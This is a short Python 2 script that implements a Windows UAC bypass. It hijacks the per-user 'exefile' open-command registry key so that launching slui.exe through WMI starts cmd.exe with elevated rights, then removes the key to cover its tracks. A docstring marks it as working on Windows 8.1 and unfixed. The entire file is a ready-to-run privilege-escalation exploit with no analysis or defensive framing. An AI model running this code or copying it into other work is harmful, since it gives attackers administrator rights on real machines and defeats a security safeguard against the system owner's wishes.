"""
Works from: Windows 8.1 (9600)
Fixed in: unfixed
"""
import os
import wmi
import time
import _winreg
import win32con
from colorama import init, Fore
init(convert=True)

wmi = wmi.WMI()

payload = "c:\\windows\\system32\\cmd.exe"

def successBox():
	return (Fore.GREEN + '[+]' + Fore.RESET)
	
def errorBox():
	return (Fore.RED + '[-]' + Fore.RESET)

def infoBox():
	return (Fore.CYAN + '[!]' + Fore.RESET)	
	
def warningBox():
	return (Fore.YELLOW + '[!]' + Fore.RESET)

def slui():
	print " {} slui: Attempting to create registry key".format(infoBox())
	try:
		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
					os.path.join("Software\Classes\exefile\shell\open\command"))
								
		_winreg.SetValueEx(key,
				None,
				0,
				_winreg.REG_SZ,
				payload)

		_winreg.SetValueEx(key,
				"DelegateExecute",
				0,
				_winreg.REG_SZ,
				None)

		_winreg.CloseKey(key)
		print " {} slui: Registry key created".format(successBox())
	except Exception as error:
		print " {} slui: Unable to create key".format(errorBox())
		return False

	print " {} slui: Pausing for 5 seconds before executing".format(infoBox())
	time.sleep(5)

	print " {} slui: Attempting to create process".format(infoBox())
	try:
		result = wmi.Win32_Process.Create(CommandLine="cmd.exe /c start slui.exe",
						ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=win32con.SW_SHOWNORMAL))
		if (result[1] == 0):
			print " {} slui: Process started successfully".format(successBox())
		else:
			print " {} slui: Problem creating process".format(errorBox())
	except Exception as error:
		print " {} slui: Problem creating process".format(errorBox())
		return False

	print " {} slui: Pausing for 5 seconds before cleaning".format(infoBox())
	time.sleep(5)

	print " {} slui: Attempting to remove registry key".format(infoBox())
	try:
		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,
				os.path.join("Software\Classes\exefile\shell\open\command"))
		print " {} slui: Registry key was deleted".format(successBox())					
	except Exception as error:
		print " {} slui: Unable to delete key".format(errorBox())
		return False
